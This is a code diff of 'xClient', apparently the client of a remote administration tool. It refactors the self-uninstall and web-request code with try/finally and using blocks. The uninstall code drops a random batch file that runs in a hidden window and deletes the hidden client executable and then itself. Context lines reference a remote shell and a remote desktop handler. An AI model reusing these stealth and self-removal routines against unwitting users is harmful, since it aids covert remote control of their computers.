@@ -171,33 +171,38 @@ namespace xClient.Core.Commands
 				}
 			}
 
-			string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
-			
-			string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ? 
-					"@echo off" + "\n" +
-					"echo DONT CLOSE THIS WINDOW!" + "\n" +
-					"ping -n 20 localhost > nul" + "\n" +
-					"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-					"del " + "\"" + filename + "\""
-				:
-					"@echo off" + "\n" +
-					"echo DONT CLOSE THIS WINDOW!" + "\n" +
-					"ping -n 20 localhost > nul" + "\n" +
-					"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-					"del " + "\"" + filename + "\""
-				;
+            try
+            {
+                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
 
-			File.WriteAllText(filename, uninstallBatch);
-			ProcessStartInfo startInfo = new ProcessStartInfo();
-			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-			startInfo.CreateNoWindow = true;
-			startInfo.UseShellExecute = true;
-			startInfo.FileName = filename;
-			Process.Start(startInfo);
+                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
+                        "@echo off" + "\n" +
+                        "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                        "ping -n 20 localhost > nul" + "\n" +
+                        "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+                        "del " + "\"" + filename + "\""
+                    :
+                        "@echo off" + "\n" +
+                        "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                        "ping -n 20 localhost > nul" + "\n" +
+                        "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+                        "del " + "\"" + filename + "\""
+                    ;
 
-			CloseShell();
-			SystemCore.Disconnect = true;
-			client.Disconnect();
+                File.WriteAllText(filename, uninstallBatch);
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                startInfo.CreateNoWindow = true;
+                startInfo.UseShellExecute = true;
+                startInfo.FileName = filename;
+                Process.Start(startInfo);
+            }
+            finally
+            {
+                CloseShell();
+                SystemCore.Disconnect = true;
+                client.Disconnect();
+            }
 		}
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
@@ -411,12 +416,17 @@ namespace xClient.Core.Commands
 						Request.AllowAutoRedirect = true;
 						Request.Timeout = 10000;
 						Request.Method = "GET";
-						HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
-						Stream DataStream = Response.GetResponseStream();
-						StreamReader reader = new StreamReader(DataStream);
-						reader.Close();
-						DataStream.Close();
-						Response.Close();
+
+                        using (HttpWebResponse Response = (HttpWebResponse)Request.GetResponse())
+                        {
+                            using (Stream DataStream = Response.GetResponseStream())
+                            {
+                                using (StreamReader reader = new StreamReader(DataStream))
+                                {
+
+                                }
+                            }
+                        }
 					}
 					catch
 					{ }
